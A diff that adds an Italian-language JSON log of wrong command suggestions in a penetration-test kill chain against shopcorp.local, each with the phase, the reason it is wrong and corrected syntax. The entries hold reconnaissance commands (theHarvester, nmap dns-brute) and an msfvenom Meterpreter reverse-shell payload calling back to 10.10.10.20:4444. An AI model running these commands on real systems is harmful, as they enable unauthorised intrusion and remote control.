@@ -1,1 +1,26 @@
-[]
+[
+  {
+    "fase": "ricognizione",
+    "suggerimento_errato": "theHarvester -d shopcorp.local -p asn,emails,dns",
+    "motivo": "Sintassi errata per theHarvester. La sintassi corretta sarebbe: 'theHarvester -d shopcorp.local -b all'",
+    "timestamp": "2025-06-20T16:14:55.416786"
+  },
+  {
+    "fase": "ricognizione",
+    "suggerimento_errato": "### Risposta attendibile:\n'nmap -p 53 -sUV --script=dns-brute ns[12].shopcorp.local'",
+    "motivo": "La sintassi è errata. Sintassi corretta: 'nmap -p 53 -sU -sV --script=dns-brute ns1.shopcorp.local ns2.shopcorp.local'",
+    "timestamp": "2025-06-23T16:40:54.713090"
+  },
+  {
+    "fase": "ricognizione",
+    "suggerimento_errato": "`nmap `",
+    "motivo": "suggerimento generico, non va bene in uno step operativo in una kill-chain",
+    "timestamp": "2025-06-25T21:59:33.301374"
+  },
+  {
+    "fase": "weaponization",
+    "suggerimento_errato": "`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -f a LDATA=\"ssh user@10.10.10.20 -p 4444\" -o payload.mysql`",
+    "motivo": "Il comando suggerito non è valido perché contiene opzioni non supportate da msfvenom e non rispetta la sintassi reale del tool. In particolare, il formato del payload e alcune opzioni (LDATA) sono errati.",
+    "timestamp": "2025-06-25T23:17:38.843008"
+  }
+]
